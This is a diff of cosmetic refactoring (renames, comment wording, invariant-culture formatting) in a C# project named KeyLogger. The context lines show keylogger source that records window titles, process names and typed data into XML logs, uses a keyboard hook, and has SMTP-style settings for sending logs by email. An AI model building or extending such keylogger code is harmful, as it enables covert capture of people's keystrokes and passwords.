@@ -392,7 +392,7 @@ namespace KeyLogger
                 }
 
                 logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine
-                           + string.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
+                           + string.Format("LOG FILE, Data {0}", DateTime.Now.ToString(CultureInfo.InvariantCulture));
                 return logdata;
             }
             catch (Exception ex)
@@ -525,14 +525,14 @@ namespace KeyLogger
         {
             try
             {
-                string xlspath = this.logFilePath.Substring(0, this.logFilePath.LastIndexOf("\\", System.StringComparison.Ordinal) + 1)
+                string xlspath = this.logFilePath.Substring(0, this.logFilePath.LastIndexOf("\\", StringComparison.Ordinal) + 1)
                                  + "ApplogXSL.xsl";
                 if (!File.Exists(xlspath))
                 {
                     File.Create(xlspath).Close();
-                    const string xslcontents = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
+                    const string Xslcontents = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                     var xslwriter = new StreamWriter(xlspath);
-                    xslwriter.Write(xslcontents);
+                    xslwriter.Write(Xslcontents);
                     xslwriter.Flush();
                     xslwriter.Close();
                 }
@@ -552,7 +552,7 @@ namespace KeyLogger
                     string processname = "<![CDATA["
                                          + element.Key.ToString()
                                                   .Trim()
-                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", System.StringComparison.Ordinal))
+                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal))
                                                   .Trim() + "]]>";
                     processname = processname.Replace("\0", string.Empty);
                     writer.Write(processname);
@@ -562,7 +562,7 @@ namespace KeyLogger
                     string applname = "<![CDATA["
                                       + element.Key.ToString()
                                                .Trim()
-                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", System.StringComparison.Ordinal) + 6)
+                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal) + 6)
                                                .Trim() + "]]>";
                     writer.Write(applname);
                     writer.Write("</ApplicationName>");
@@ -631,7 +631,7 @@ namespace KeyLogger
         }
 
         /// <summary>
-        /// The timer logsaver tick.
+        /// The timer log saver tick event handler.
         /// </summary>
         /// <param name="sender">The sender argument.</param>
         /// <param name="e">The event argument.</param>
@@ -641,11 +641,11 @@ namespace KeyLogger
         }
 
         /// <summary>
-        /// The mnu item_ settings_ click.
+        /// The settings menu item click event handler.
         /// </summary>
         /// <param name="sender">The sender argument.</param>
         /// <param name="e">The event argument.</param>
-        private void mnuItem_Settings_Click(object sender, EventArgs e)
+        private void MnuItemSettingsClick(object sender, EventArgs e)
         {
             // we don't want log our email password!
             if (this.hooker.IsActive)
@@ -697,14 +697,14 @@ namespace KeyLogger
         #endregion
 
         /// <summary>
-        /// The params.
+        /// The parameters.
         /// </summary>
         public class Params
         {
             #region Fields
 
             /// <summary>
-            /// The enable ssl.
+            /// The enable SSL.
             /// </summary>
             public bool EnableSsl;
 
